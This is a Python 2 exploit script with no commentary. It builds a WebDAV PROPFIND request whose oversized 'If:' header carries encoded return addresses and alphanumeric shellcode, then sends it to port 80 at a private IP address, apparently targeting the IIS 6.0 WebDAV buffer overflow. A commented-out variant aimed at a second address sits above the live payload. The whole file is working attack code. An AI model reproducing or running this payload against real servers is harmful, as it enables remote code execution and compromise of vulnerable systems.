import socket  

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(('192.168.68.1',80))  

##pay='''PROPFIND / HTTP/1.1\r\nHost: 192.168.56.102\r\nContent-Length: 0\r\n'
#pay+='If: <http://192.168.56.102/aaaaaaa'
#pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
#pay+=' (Not <locktoken:write1>) <http://192.168.56.102/bbbbbbb'
#shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'
#pay+=shellcode
#pay+='>\r\n\r\n'

payload='PROPFIND / HTTP/1.1\r\nHost: 192.168.68.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nContent-Length: 0\r\n'
payload+='If: <http://192.168.68.1:80/XLFLSAXPwyINBzZSTuZXSxVzmXBNTTAbvOAqueTvPJyCnjbjZhWzCZNfcmpBFsbXYNDzfLKSUMMxROxTkBmuagIimJaAoix'
payload+='\xE4\x8D\x94\xE6\xB1\x82\xE6\xB1\xB2\xE6\xAD\xAA\xE5\x99\xA1\xE4\xA1\xB9\xE5\x85\x82\xE4\x9D\x86\xE5\x95\xA9\xE6\x85\x8D\xE5\x91\x9A\xE6\x9D\xB3\xE4\xBD\xBA\xE7\x99\x94\xE4\xAD\xA4\xE4\x8D\xB9\xC8\x82\xC8\x82\xE1\x8B\x80\xE6\xA0\x83\xE4\x95\x98\xE6\x85\xA1\xE4\x91\x95\xE6\x89\x97\xE7\x81\xA6\xE7\xA5\x95\xE4\xBD\x92\xE5\x85\x94\xE5\xA1\x83\xE6\xB1\x82\xE6\xA5\x9A\xE6\x89\xAF\xE7\x91\xB0\xE6\xBD\xB2\xE4\xA9\xA9\xE4\xA5\xA5\xE6\xA5\x88\xE5\xA5\xAA\xE6\x9D\x8B\xE6\xB1\x95\xE1\x8F\x80\xE6\xA0\x83'
payload+='>'
payload+=' (Not <locktoken:write1>) <http://192.168.68.1:80/lNYqwSlWgMxjvrdSMnCVVzDXcSfMEAXYPPbLhsnupccYvkrOeuKrsULnBJzhmdORvBWTMDlpBnJVTyWPJuHafdRLOpTXLcF'

payload+='\xE4\xB5\x84\xE5\x91\xB4\xE6\x95\x82\xE5\x8D\xB7\xE6\xBD\xA6\xE4\xBD\x83\xE5\x95\x8C\xE7\x95\x86\xE7\x95\xAB\xE5\x81\xAF\xE7\x81\x92\xE5\x81\x98\xE4\xB1\x90\xE4\xA9\xB5\xE1\x8F\x80\xE6\xA0\x83\xEF\x8E\x8D\xE7\x9E\xBD\xE7\x95\x94\xE6\x89\xA3\xE5\x8D\xB5\xE4\xB1\x89\xE1\x8F\x80\xE6\xA0\x83\xE4\xA1\x88\xE7\x89\xB0\xE6\xA5\x84\xE6\xA1\xA6\xE5\xA5\x92\xE6\xA1\x95\xE6\x85\x84\xE6\xBD\x99\xE6\x82\x82\xE6\xA0\x81\xEB\x81\xAC\xE7\x9E\xBC\xEF\x80\x81\xE7\x9E\xBE\xE2\x95\xA3\xE7\x9E\xBB\xE1\x84\x94\xE7\x9E\xBA\xEF\x89\x84\xE7\x9E\xBB\xE4\x85\x81\xE4\x85\x81\xEE\xB8\xA2\xE7\x9E\xBB\xE9\xA0\x81\xE7\x9E\xBC\xE2\x89\xA5\xE7\x9E\xBE\xE2\x95\xA3\xE7\x9E\xBB\xE9\x91\xAF\xCF\x80\xED\x91\x81\xE7\x9E\xBD\xE4\xA3\x93\xE7\x9E\xBB\xE2\x87\xA0\xE7\x9E\xBF\xEF\x84\x82\xE7\x9E\xBB\xEF\xB0\x82\xE7\x9E\xBB\xEF\x80\x81\xE7\x9E\xBE\xE8\xB0\x84\xE7\x9E\xBD\xE8\xB0\x85\xE7\x9E\xBD\xE2\x95\xA3\xE7\x9E\xBB\xE9\x91\x8F\xCF\x80\xED\x91\x81\xE7\x9E\xBD\xE8\x8A\x85\xE7\x9E\xBB\xE2\x95\xA3\xE7\x9E\xBB\xE9\x82\x90\xE9\x82\x90\xE6\x96\x91\xE7\x9E\xBE\xE5\xB9\x94\xEC\x9A\x83\xE4\x84\x8A'

shell='VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA'
payload+=shell
payload+='>\r\n\r\n'
print payload

sock.send(payload)  
data = sock.recv(100000)  

print data 
sock.close